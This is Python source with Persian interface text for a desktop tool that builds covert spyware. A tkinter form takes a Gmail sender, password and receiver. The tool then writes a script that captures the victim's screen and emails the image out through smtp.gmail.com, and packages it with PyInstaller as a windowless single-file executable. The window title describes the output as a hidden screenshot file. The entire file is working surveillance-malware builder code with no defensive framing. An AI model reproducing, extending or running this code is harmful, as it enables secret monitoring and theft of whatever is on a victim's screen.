import tkinter as tk
from tkinter import messagebox
import subprocess
import sys
import os
import threading
import shutil

def build_script():
    sender = entry_sender.get().strip()
    password = entry_password.get().strip()
    receiver = entry_receiver.get().strip()

    if not (sender and password and receiver):
        messagebox.showerror("خطا", "همه فیلدها باید پر شوند.")
        return

    build_dir = os.path.abspath("temp_build")
    os.makedirs(build_dir, exist_ok=True)

    script_content = f'''
import time
import smtplib
import io
from PIL import ImageGrab
from email.mime.image import MIMEImage

sender_email = "{sender}"
sender_password = "{password}"
receiver_email = "{receiver}"

class ScreenShot:
    def take_and_send_screenshot(self):
        image = ImageGrab.grab()
        buffer = io.BytesIO()
        image.save(buffer, format='PNG')
        buffer.seek(0)

        msg = MIMEImage(buffer.read())
        msg['Subject'] = '📸 Screenshot Captured'
        msg['From'] = sender_email
        msg['To'] = receiver_email

        try:
            with smtplib.SMTP_SSL('smtp.gmail.com', 465) as server:
                server.login(sender_email, sender_password)
                server.sendmail(sender_email, receiver_email, msg.as_string())
        except Exception as e:
            print(f"Error sending email: {{e}}")

if __name__ == "__main__":
    time.sleep(3)
    ScreenShot().take_and_send_screenshot()
'''

    script_path = os.path.join(build_dir, "screenshot_mailer.py")
    with open(script_path, "w", encoding="utf-8") as f:
        f.write(script_content)

    def run_pyinstaller():
        try:
            python_exe = sys.executable

            # حذف فایل‌های قبلی از پوشه temp_build
            for sub in ["build", "dist"]:
                subpath = os.path.join(build_dir, sub)
                if os.path.exists(subpath):
                    shutil.rmtree(subpath)
            spec_file = os.path.join(build_dir, "screenshot_mailer.spec")
            if os.path.exists(spec_file):
                os.remove(spec_file)

            # اجرای PyInstaller داخل temp_build
            cmd = [
                python_exe,
                "-m", "PyInstaller",
                "--noconfirm",
                "--noconsole",
                "--onefile",
                "screenshot_mailer.py"
            ]

            result = subprocess.run(cmd, cwd=build_dir, capture_output=True, text=True)

            print("PyInstaller STDOUT:\n", result.stdout)
            print("PyInstaller STDERR:\n", result.stderr)

            if result.returncode != 0:
                raise Exception(f"PyInstaller error:\n{result.stderr}")

            # مسیر فایل exe ساخته شده
            exe_name = "screenshot_mailer.exe"
            built_exe_path = os.path.join(build_dir, "dist", exe_name)

            print("Looking for exe at:", built_exe_path)

            if not os.path.exists(built_exe_path):
                print("exe not found at expected path.")
                dist_contents = os.listdir(os.path.join(build_dir, "dist"))
                print("dist folder contents:", dist_contents)
                raise Exception(f"فایل نهایی exe ساخته نشد:\n{built_exe_path}")

            # انتقال فایل نهایی به پوشه dist اصلی پروژه
            final_dist = os.path.join(os.getcwd(), "dist")
            os.makedirs(final_dist, exist_ok=True)
            shutil.copy(built_exe_path, os.path.join(final_dist, exe_name))

            status_label.config(text="✅ فایل exe در dist/ ساخته شد")
            messagebox.showinfo("موفق", f"{exe_name} ساخته شد.\nمکان: dist/")
        except Exception as e:
            status_label.config(text="❌ خطا")
            messagebox.showerror("خطا", str(e))
        finally:
            btn_build.config(state=tk.NORMAL)

    btn_build.config(state=tk.DISABLED)
    status_label.config(text="⏳ در حال ساخت فایل exe...")
    threading.Thread(target=run_pyinstaller, daemon=True).start()


# رابط گرافیکی
root = tk.Tk()
root.title("ساخت فایل مخفی اسکرین‌شات")
root.geometry("500x400")
root.resizable(False, False)

tk.Label(root, text="📧 ایمیل فرستنده:").pack()
entry_sender = tk.Entry(root, width=50)
entry_sender.pack()

tk.Label(root, text="🔒 رمز عبور:").pack()
entry_password = tk.Entry(root, width=50, show="*")
entry_password.pack()

tk.Label(root, text="📨 ایمیل گیرنده:").pack()
entry_receiver = tk.Entry(root, width=50)
entry_receiver.pack()

btn_build = tk.Button(root, text="✅ ساخت فایل exe", command=build_script, bg="green", fg="white", width=20)
btn_build.pack(pady=10)

status_label = tk.Label(root, text="", fg="blue")
status_label.pack()

root.mainloop()
